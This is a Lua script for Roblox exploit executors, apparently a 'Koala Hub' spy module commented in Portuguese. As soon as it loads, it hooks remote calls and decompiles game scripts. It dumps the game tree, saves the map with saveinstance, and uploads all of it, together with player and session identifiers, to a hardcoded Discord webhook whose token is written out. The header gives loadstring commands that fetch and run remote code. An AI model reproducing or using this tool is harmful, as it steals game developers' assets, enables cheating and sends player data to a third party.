--[[
    KOALA HUB — MODULO SPY v4 / DUMP COMPLETO PRO DISCORD
    ------------------------------------------------------
    Ao carregar (standalone OU via hub), envia AUTOMATICAMENTE pro webhook:

      1) Info da sessao: jogo, PlaceId, UniverseId, PlaceVersion, criador,
         JobId, player (nome/UserId/AccountAge), executor, data/hora.
      2) REMOTES (.txt): todos os RemoteEvent / RemoteFunction /
         UnreliableRemoteEvent / BindableEvent / BindableFunction.
      3) ARVORE COMPLETA (.txt): TODAS as instancias do jogo, classe +
         caminho completo (trunca em 250 mil linhas se for gigante).
      4) SCRIPTS (.txt): lista de todo Script / LocalScript / ModuleScript.
         Se o executor tiver decompile(), envia tambem as FONTES
         decompiladas (.lua.txt, em partes de ate ~18 MB).
      5) MAPA (.rbxl): saveinstance() + upload do arquivo — abre no
         Roblox Studio / Studio Lite.

    E em tempo real: SPY de FireServer / InvokeServer (lotes de texto a
    cada 5s) + log de sessao exportavel.

    Standalone (sem interface, com notificacoes na tela):
        loadstring(game:HttpGet("https://raw.githubusercontent.com/rodrigsapps/KoalaUI/main/KoalaSpy.lua"))()

    Ofuscado:
        loadstring(game:HttpGet("https://raw.githubusercontent.com/rodrigsapps/KoalaUI/main/KoalaSpy_obf.lua"))()

    NOTA DE ESCOPO: envia somente o que o modulo gera no JOGO. Executores
    nao alcancam pastas do aparelho (Downloads etc.) — as funcoes de
    arquivo sao presas ao workspace do executor.
]]

--==================================================================--
--  CONFIG
--==================================================================--
local WEBHOOK_URL = "https://discord.com/api/webhooks/1546164688994177112/FVxL0qlwRYpI6ITaoTbK0qqchk2cxCrxB_r_5DDDV_HGEAzmYB5lDBwCyqtLI2GYiZ52"
local INTERVALO_FILA = 5
local MAX_MSG        = 1800
local MAX_FILA       = 400
local MAX_ARG_STR    = 300
local MAX_PROFUND    = 4
local MAX_UPLOAD     = 24 * 1024 * 1024   -- ~24 MB (limite Discord free)
local MAX_LOG_SESSAO = 5000
local PASTA_GRAVACOES= "KoalaHub/gravacoes"

-- envio automatico ao entrar no jogo:
local AUTO_DUMP    = true   -- remotes
local AUTO_ARVORE  = true   -- arvore completa de instancias
local AUTO_SCRIPTS = true   -- lista de scripts + fontes (se houver decompile)
local AUTO_MAPA    = true   -- saveinstance + upload do .rbxl

local MAX_ARVORE_LINHAS     = 250000
local MAX_DECOMPILE_SCRIPTS = 150
local MAX_FONTE_UNICA       = 1000000     -- corta script gigante
local MAX_FONTES_BYTES      = 18 * 1024 * 1024

local State = { spyAtivo = true }

--==================================================================--
--  HELPERS
--==================================================================--
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local MarketplaceService= game:GetService("MarketplaceService")
local LP = Players.LocalPlayer

local function notify(msg, dur, Koala)
    print("[KoalaSpy] " .. tostring(msg))
    pcall(function()
        if Koala and Koala.Notify then
            Koala:Notify({ Title = "Koala Spy", Content = msg, Duration = dur or 3 })
            return
        end
        game:GetService("StarterGui"):SetCore("SendNotification",
            { Title = "Koala Spy", Text = msg, Duration = dur or 4 })
    end)
end

local function env(nome)
    local ok, f = pcall(function() return getfenv()[nome] end)
    if ok then return f end
    return nil
end

local httpRequest = env("request") or env("http_request")
    or (syn and syn.request) or (http and http.request)
    or (fluxus and fluxus.request)

local FS = {
    write = env("writefile"),  read  = env("readfile"),
    list  = env("listfiles"),  isfile= env("isfile"),
    mkdir = env("makefolder"), isdir = env("isfolder"),
}
local saveinstance    = env("saveinstance")
local decompile       = env("decompile")
local identifyexecutor= env("identifyexecutor")

local function postWebhook(content)
    if not content or #content == 0 then return false end
    if #content > 1990 then content = content:sub(1, 1990) end
    local body = HttpService:JSONEncode({ content = content })

    if httpRequest then
        local ok, res = pcall(function()
            return httpRequest({
                Url = WEBHOOK_URL, Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body,
            })
        end)
        if ok and res and (res.StatusCode == 200 or res.StatusCode == 204) then
            return true
        end
    end

    local ok2 = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
    end)
    return ok2
end

local function postWebhookFile(nomeArquivo, conteudo, mensagem)
    if not httpRequest then return false, "executor sem request" end
    if not conteudo or #conteudo == 0 then return false, "vazio" end

    local boundary = "----KoalaBoundary" .. tostring(math.random(100000, 999999999))
    local payload  = HttpService:JSONEncode({ content = mensagem or "" })

    local corpo = table.concat({
        "--" .. boundary .. "\r\n",
        'Content-Disposition: form-data; name="payload_json"\r\n',
        "Content-Type: application/json\r\n\r\n",
        payload, "\r\n",
        "--" .. boundary .. "\r\n",
        'Content-Disposition: form-data; name="files[0]"; filename="', nomeArquivo, '"\r\n',
        "Content-Type: application/octet-stream\r\n\r\n",
        conteudo, "\r\n",
        "--" .. boundary .. "--\r\n",
    })

    local ok, res = pcall(function()
        return httpRequest({
            Url = WEBHOOK_URL, Method = "POST",
            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
            Body = corpo,
        })
    end)
    if ok and res and (res.StatusCode == 200 or res.StatusCode == 204) then
        return true
    end
    return false, ok and ("HTTP " .. tostring(res and res.StatusCode)) or tostring(res)
end

--==================================================================--
--  FILA DE TEXTO (spy ao vivo) — evita rate limit
--==================================================================--
local fila = {}
local enviando = false

local function enfileirar(texto)
    if #fila >= MAX_FILA then table.remove(fila, 1) end
    table.insert(fila, texto)
end

--==================================================================--
--  INFO DA SESSAO
--==================================================================--
local function infoSessao()
    local nomeJogo = "?"
    pcall(function()
        nomeJogo = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    local exec = "?"
    pcall(function()
        if identifyexecutor then
            local a, b = identifyexecutor()
            exec = tostring(a) .. (b and (" " .. tostring(b)) or "")
        end
    end)
    return table.concat({
        "Jogo: " .. tostring(nomeJogo),
        string.format("PlaceId: %d | UniverseId: %s | PlaceVersion: %s",
            game.PlaceId, tostring(game.GameId), tostring(game.PlaceVersion)),
        "Criador: " .. tostring(game.CreatorType) .. " " .. tostring(game.CreatorId),
        "JobId: " .. tostring(game.JobId),
        string.format("Player: %s (UserId %s, AccountAge %sd) | Server: %d/%d",
            LP and LP.Name or "?", LP and tostring(LP.UserId) or "?",
            LP and tostring(LP.AccountAge) or "?",
            #Players:GetPlayers(), Players.MaxPlayers),
        "Executor: " .. exec,
        "Data: " .. os.date("!%d/%m/%Y %H:%M") .. " UTC",
    }, "\n")
end

--==================================================================--
--  SERIALIZACAO DE VALORES
--==================================================================--
local serializar
serializar = function(v, prof)
    prof = prof or 0
    local t = typeof(v)

    if t == "string" then
        if #v > MAX_ARG_STR then v = v:sub(1, MAX_ARG_STR) .. "..." end
        return string.format("%q", v)
    elseif t == "number" or t == "boolean" or t == "nil" then
        return tostring(v)
    elseif t == "Instance" then
        local ok, caminho = pcall(function() return v:GetFullName() end)
        return "Instance(" .. (ok and caminho or tostring(v)) .. ")"
    elseif t == "Vector3" then
        return string.format("Vector3(%.2f, %.2f, %.2f)", v.X, v.Y, v.Z)
    elseif t == "Vector2" then
        return string.format("Vector2(%.2f, %.2f)", v.X, v.Y)
    elseif t == "CFrame" then
        local p = v.Position
        return string.format("CFrame(%.2f, %.2f, %.2f)", p.X, p.Y, p.Z)
    elseif t == "Color3" then
        return string.format("Color3(%.2f, %.2f, %.2f)", v.R, v.G, v.B)
    elseif t == "BrickColor" or t == "EnumItem" then
        return tostring(v)
    elseif t == "UDim2" then
        return "UDim2(" .. tostring(v) .. ")"
    elseif t == "table" then
        if prof >= MAX_PROFUND then return "{...}" end
        local partes, n = {}, 0
        for k, val in pairs(v) do
            n = n + 1
            if n > 30 then table.insert(partes, "...") break end
            local chave = (type(k) == "string") and (k .. " = ") or ("[" .. tostring(k) .. "] = ")
            table.insert(partes, chave .. serializar(val, prof + 1))
        end
        return "{" .. table.concat(partes, ", ") .. "}"
    else
        return t .. "(" .. tostring(v) .. ")"
    end
end

local function serializarArgs(args)
    local partes = {}
    for i = 1, #args do
        table.insert(partes, serializar(args[i]))
    end
    return table.concat(partes, ", ")
end

local function caminhoDe(inst)
    local ok, c = pcall(function() return inst:GetFullName() end)
    if ok then return c end
    return tostring(inst)
end

--==================================================================--
--  1) DUMP DE REMOTES (.txt)
--==================================================================--
local CLASSES_REMOTE = {
    RemoteEvent = true, RemoteFunction = true, UnreliableRemoteEvent = true,
    BindableEvent = true, BindableFunction = true,
}

local function dumpRemotes()
    local linhas = {
        "KOALA SPY — DUMP DE REMOTES",
        infoSessao(),
        string.rep("-", 60),
    }
    local n = 0
    for _, inst in ipairs(game:GetDescendants()) do
        if CLASSES_REMOTE[inst.ClassName] then
            n = n + 1
            table.insert(linhas, string.format("[%s] %s", inst.ClassName, caminhoDe(inst)))
        end
    end
    table.insert(linhas, string.rep("-", 60))
    table.insert(linhas, "Total: " .. n .. " remotes")

    local conteudo = table.concat(linhas, "\n")
    local ok = postWebhookFile(
        string.format("koala_remotes_%d.txt", game.PlaceId),
        conteudo,
        "**[Koala Spy] REMOTES — " .. n .. " encontrados**"
    )
    if not ok then
        enfileirar(string.format("**[Koala Spy] DUMP — %d remotes**", n))
        for i = 4, #linhas do enfileirar(linhas[i]) end
    end
    return n
end

--==================================================================--
--  2) SPY AO VIVO + LOG DE SESSAO
--==================================================================--
local spyLigado = false
local logSessao = {}
local getnamecallmethod = env("getnamecallmethod")
local hookmetamethod    = env("hookmetamethod")
local hookfunction      = env("hookfunction")
local newcclosure       = env("newcclosure") or function(f) return f end

local function ehRemoteValido(self)
    return typeof(self) == "Instance"
        and (self.ClassName == "RemoteEvent" or self.ClassName == "RemoteFunction"
             or self.ClassName == "UnreliableRemoteEvent")
end

local function logarChamada(self, metodo, args)
    if not State.spyAtivo then return end
    if not ehRemoteValido(self) then return end
    local linha = string.format("[SPY] %s :%s( %s )\n      -> %s",
        self.Name, metodo, serializarArgs(args), caminhoDe(self))
    enfileirar(linha)
    if #logSessao >= MAX_LOG_SESSAO then table.remove(logSessao, 1) end
    table.insert(logSessao, linha)
end

local function ligarSpy()
    if spyLigado then return true end

    if hookmetamethod and getnamecallmethod then
        local velho
        velho = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            local metodo = getnamecallmethod()
            if (metodo == "FireServer" or metodo == "InvokeServer") and ehRemoteValido(self) then
                pcall(logarChamada, self, metodo, { ... })
            end
            return velho(self, ...)
        end))
        spyLigado = true
        return true
    end

    if hookfunction then
        local okFire = pcall(function()
            local velho
            velho = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
                pcall(logarChamada, self, "FireServer", { ... })
                return velho(self, ...)
            end))
        end)
        local okInvoke = pcall(function()
            local velho
            velho = hookfunction(Instance.new("RemoteFunction").InvokeServer, newcclosure(function(self, ...)
                pcall(logarChamada, self, "InvokeServer", { ... })
                return velho(self, ...)
            end))
        end)
        if okFire or okInvoke then
            spyLigado = true
            return true
        end
    end

    return false
end

--==================================================================--
--  3) ARVORE COMPLETA DO JOGO (.txt)
--==================================================================--
local function dumpArvore(Koala)
    notify("Gerando arvore completa do jogo...", 3, Koala)
    local linhas = {
        "KOALA SPY — ARVORE COMPLETA DO JOGO",
        infoSessao(),
        string.rep("-", 60),
    }
    local desc = game:GetDescendants()
    local total = #desc
    local limite = math.min(total, MAX_ARVORE_LINHAS)
    for i = 1, limite do
        local inst = desc[i]
        table.insert(linhas, string.format("[%s] %s", inst.ClassName, caminhoDe(inst)))
    end
    if total > limite then
        table.insert(linhas, string.format("... TRUNCADO em %d de %d instancias", limite, total))
    end
    table.insert(linhas, string.rep("-", 60))
    table.insert(linhas, "Total de instancias: " .. total)

    local conteudo = table.concat(linhas, "\n")
    if #conteudo > MAX_UPLOAD then
        conteudo = conteudo:sub(1, MAX_UPLOAD - 200) .. "\n... CORTADO (limite de upload)"
    end

    local ok, err = postWebhookFile(
        string.format("koala_arvore_%d.txt", game.PlaceId),
        conteudo,
        "**[Koala Spy] ARVORE COMPLETA — " .. total .. " instancias**"
    )
    notify(ok and ("Arvore enviada (" .. total .. " instancias).")
        or ("Arvore: falha no envio (" .. tostring(err) .. ")"), 4, Koala)
    return total
end

--==================================================================--
--  4) SCRIPTS — lista (.txt) + fontes decompiladas (.lua.txt)
--==================================================================--
local function dumpScripts(Koala)
    local lista = {}
    for _, inst in ipairs(game:GetDescendants()) do
        local c = inst.ClassName
        if c == "LocalScript" or c == "ModuleScript" or c == "Script" then
            table.insert(lista, inst)
        end
    end

    -- 4a) lista de caminhos
    do
        local linhas = {
            "KOALA SPY — LISTA DE SCRIPTS",
            infoSessao(),
            string.rep("-", 60),
        }
        for _, s in ipairs(lista) do
            table.insert(linhas, string.format("[%s] %s", s.ClassName, caminhoDe(s)))
        end
        table.insert(linhas, string.rep("-", 60))
        table.insert(linhas, "Total: " .. #lista .. " scripts")
        postWebhookFile(
            string.format("koala_scripts_%d.txt", game.PlaceId),
            table.concat(linhas, "\n"),
            "**[Koala Spy] LISTA DE SCRIPTS — " .. #lista .. "**"
        )
    end

    -- 4b) fontes decompiladas (so LocalScript/ModuleScript — Script e
    -- server-side, o bytecode nao chega ao client)
    if not decompile then
        notify("Lista de scripts enviada. Executor sem decompile — fontes nao extraidas.", 4, Koala)
        return #lista
    end

    notify("Decompilando scripts... pode demorar.", 4, Koala)

    local parteNum = 1
    local buffer = {
        "KOALA SPY — FONTES DECOMPILADAS (parte " .. parteNum .. ")",
        infoSessao(),
        string.rep("-", 60),
    }
    local bytes = 0
    local feitos, falhas = 0, 0

    local function flush()
        local conteudo = table.concat(buffer, "\n")
        postWebhookFile(
            string.format("koala_fontes_%d_parte%d.lua.txt", game.PlaceId, parteNum),
            conteudo,
            "**[Koala Spy] FONTES decompiladas — parte " .. parteNum .. "**"
        )
        parteNum = parteNum + 1
        buffer = {
            "KOALA SPY — FONTES DECOMPILADAS (parte " .. parteNum .. ")",
            infoSessao(),
            string.rep("-", 60),
        }
        bytes = 0
        task.wait(2)
    end

    for i, s in ipairs(lista) do
        if i > MAX_DECOMPILE_SCRIPTS then
            table.insert(buffer, string.format(
                "... LIMITE de %d scripts decompilados (total no jogo: %d)",
                MAX_DECOMPILE_SCRIPTS, #lista))
            break
        end
        if s.ClassName ~= "Script" then
            local ok, src = pcall(decompile, s)
            if ok and type(src) == "string" and #src > 0 then
                if #src > MAX_FONTE_UNICA then
                    src = src:sub(1, MAX_FONTE_UNICA) .. "\n-- ... TRUNCADO (script gigante)"
                end
                local bloco = string.format(
                    "\n--==================================================================--\n-- [%s] %s\n--==================================================================--\n%s\n",
                    s.ClassName, caminhoDe(s), src)
                if bytes + #bloco > MAX_FONTES_BYTES then flush() end
                table.insert(buffer, bloco)
                bytes = bytes + #bloco
                feitos = feitos + 1
            else
                falhas = falhas + 1
            end
        end
        if i % 10 == 0 then task.wait() end
    end

    if bytes > 200 then flush() end
    notify(string.format("Fontes: %d decompilados, %d falhas (Scripts server-side nao vem).", feitos, falhas), 5, Koala)
    return feitos
end

--==================================================================--
--  5) MAPA (.rbxl) via saveinstance
--==================================================================--
local function snapshotArquivos()
    local set = {}
    if FS.list then
        pcall(function()
            for _, f in ipairs(FS.list("")) do set[tostring(f)] = true end
        end)
    end
    return set
end

local function salvarEEnviarMapa(Koala)
    if not saveinstance then
        return notify("Seu executor nao tem saveinstance — nao da pra extrair o mapa.", 5, Koala)
    end
    if not FS.read or not FS.list then
        return notify("Executor sem readfile/listfiles.", 4, Koala)
    end

    notify("Salvando mapa... pode demorar em jogo grande.", 4, Koala)

    local antes = snapshotArquivos()
    local nome = "koala_mapa_" .. game.PlaceId

    local ok = pcall(function() saveinstance(game, { FileName = nome, Mode = "full" }) end)
    if not ok then ok = pcall(function() saveinstance(game, { FileName = nome }) end) end
    if not ok then ok = pcall(function() saveinstance(game) end) end
    if not ok then ok = pcall(saveinstance) end
    if not ok then return notify("saveinstance falhou neste executor.", 4, Koala) end

    task.wait(2)

    -- acha o .rbxl novo: raiz (arquivo novo OU nome conhecido) e subpastas (por nome)
    local arquivo
    pcall(function()
        for _, f in ipairs(FS.list("")) do
            f = tostring(f)
            local lower = f:lower()
            if (not antes[f] and (lower:match("%.rbxl$") or lower:match("%.rbxm$")))
                or lower:find(nome:lower(), 1, true) then
                arquivo = f
            end
        end
        if not arquivo and FS.isdir then
            for _, f in ipairs(FS.list("")) do
                f = tostring(f)
                if FS.isdir(f) then
                    for _, sub in ipairs(FS.list(f)) do
                        sub = tostring(sub)
                        if sub:lower():find(nome:lower(), 1, true) then
                            arquivo = sub
                        end
                    end
                end
            end
        end
    end)

    if not arquivo then
        return notify("Mapa salvo, mas nao achei o arquivo no workspace. Procura um .rbxl novo la.", 6, Koala)
    end

    local okR, dados = pcall(FS.read, arquivo)
    if not okR or not dados then
        return notify("Salvo em: " .. arquivo .. " (nao consegui ler pra enviar)", 6, Koala)
    end

    if #dados > MAX_UPLOAD then
        return notify(string.format("Mapa tem %.1f MB — passa do limite do Discord. Arquivo: %s",
            #dados / 1048576, arquivo), 8, Koala)
    end

    local nomeArq = arquivo:match("([^/\\]+)$") or (nome .. ".rbxl")
    local okU, err = postWebhookFile(nomeArq, dados,
        "**[Koala Spy] MAPA .rbxl**\n```\n" .. infoSessao() .. "\n```")
    if okU then
        notify("Mapa enviado pro Discord! Baixa e abre no Studio.", 5, Koala)
    else
        notify("Salvo em " .. arquivo .. " mas falhou o upload (" .. tostring(err) .. ")", 6, Koala)
    end
end

--==================================================================--
--  6) ENVIO DE ARQUIVOS EXTRAS (log do spy, gravacoes)
--==================================================================--
local function enviarLogSessao(Koala)
    if #logSessao == 0 then return notify("Log vazio — nada capturado ainda.", 3, Koala) end
    local conteudo = "KOALA SPY — LOG DE SESSAO\n" .. infoSessao() .. "\n"
        .. string.rep("-", 60) .. "\n" .. table.concat(logSessao, "\n")
    local ok, err = postWebhookFile("koala_spy_log_" .. os.time() .. ".txt", conteudo,
        "**[Koala Spy] Log da sessao — " .. #logSessao .. " chamadas**")
    notify(ok and "Log enviado!" or ("Falha: " .. tostring(err)), 3, Koala)
end

local function enviarGravacoes(Koala)
    if not FS.list or not FS.read then
        return notify("Executor sem listfiles/readfile.", 3, Koala)
    end
    local enviados = 0
    pcall(function()
        for _, f in ipairs(FS.list(PASTA_GRAVACOES)) do
            f = tostring(f)
            if f:lower():match("%.json$") then
                local okR, dados = pcall(FS.read, f)
                if okR and dados and #dados > 0 and #dados < MAX_UPLOAD then
                    local nomeArq = f:match("([^/\\]+)$")
                    if postWebhookFile("koala_" .. nomeArq, dados,
                        "**[Koala Spy] Gravacao Auto Fase:** " .. nomeArq) then
                        enviados = enviados + 1
                    end
                    task.wait(1)
                end
            end
        end
    end)
    notify(enviados > 0 and (enviados .. " gravacao(oes) enviada(s).") or "Nenhuma gravacao encontrada.", 3, Koala)
end

--==================================================================--
--  BOOT (roda 1x por sessao, standalone ou via hub)
--==================================================================--
if not _G.KoalaSpyBooted then
    _G.KoalaSpyBooted = true

    -- loop de envio em lote do spy
    task.spawn(function()
        while true do
            task.wait(INTERVALO_FILA)
            if #fila > 0 and not enviando then
                enviando = true
                local lote = {}
                while #fila > 0 do
                    local parte = table.remove(fila, 1)
                    local atual = table.concat(lote, "\n")
                    if #atual + #parte + 1 > MAX_MSG then
                        table.insert(fila, 1, parte)
                        break
                    end
                    table.insert(lote, parte)
                end
                if #lote > 0 then postWebhook(table.concat(lote, "\n")) end
                enviando = false
            end
        end
    end)

    -- sequencia automatica de envio
    task.spawn(function()
        task.wait(2)

        local spyOk = ligarSpy()

        postWebhook("**[Koala Spy] SESSAO INICIADA**\n```\n" .. infoSessao() .. "\n```")
        notify("Koala Spy ativo — enviando dados pro Discord...", 5)

        if AUTO_DUMP then
            local n = dumpRemotes()
            notify("Remotes: " .. n .. " enviados.", 4)
            task.wait(3)
        end

        if AUTO_ARVORE then
            dumpArvore()
            task.wait(3)
        end

        if AUTO_SCRIPTS then
            dumpScripts()
            task.wait(3)
        end

        if AUTO_MAPA then
            salvarEEnviarMapa()
        end

        notify("Koala Spy: envio inicial concluido. Spy " .. (spyOk and "ON" or "OFF (sem hook)"), 5)
    end)
end

--==================================================================--
--  RETORNO: anexa a aba "Spy" na UI do hub (standalone ignora)
--==================================================================--
return function(Koala, Window, Flags)
    if Flags then
        if Flags.SpyAtivo ~= nil then State.spyAtivo = Flags.SpyAtivo end
        Flags.SpyAtivo = State.spyAtivo
    end

    if not Window then return end

    local ok, err = pcall(function()
        local SpyTab = Window:Tab({ Title = "Spy", Icon = "radar" })

        SpyTab:Paragraph({
            Title = "Koala Spy",
            Desc = "Envia automaticamente pro Discord: remotes, arvore do jogo, scripts decompilados e mapa .rbxl. Spy ao vivo de FireServer/InvokeServer.",
        })

        SpyTab:Toggle({
            Title = "Spy ao vivo (FireServer/InvokeServer)",
            Value = State.spyAtivo,
            Callback = function(v)
                State.spyAtivo = v
                if Flags then Flags.SpyAtivo = v end
                notify(v and "Spy ligado." or "Spy pausado.", 2, Koala)
            end,
        })

        SpyTab:Button({
            Title = "Reenviar REMOTES (.txt)",
            Callback = function()
                task.spawn(function()
                    local n = dumpRemotes()
                    notify("Dump enviado: " .. n .. " remotes.", 3, Koala)
                end)
            end,
        })

        SpyTab:Button({
            Title = "Enviar ARVORE completa (.txt)",
            Callback = function() task.spawn(function() dumpArvore(Koala) end) end,
        })

        SpyTab:Button({
            Title = "Enviar SCRIPTS + fontes (.txt)",
            Callback = function() task.spawn(function() dumpScripts(Koala) end) end,
        })

        SpyTab:Button({
            Title = "Salvar MAPA (.rbxl) e enviar",
            Callback = function() task.spawn(function() salvarEEnviarMapa(Koala) end) end,
        })

        SpyTab:Button({
            Title = "Enviar LOG do spy (.txt)",
            Callback = function() task.spawn(function() enviarLogSessao(Koala) end) end,
        })

        SpyTab:Button({
            Title = "Enviar gravacoes Auto Fase (.json)",
            Callback = function() task.spawn(function() enviarGravacoes(Koala) end) end,
        })

        SpyTab:Button({
            Title = "Testar webhook",
            Callback = function()
                task.spawn(function()
                    local okEnvio = postWebhook("**[Koala Spy] Teste OK**\n```\n" .. infoSessao() .. "\n```")
                    notify(okEnvio and "Webhook OK!" or "Falha no envio (request/http).", 3, Koala)
                end)
            end,
        })
    end)
    if not ok then
        warn("[KoalaSpy] aba da UI nao criada: " .. tostring(err))
    end
end
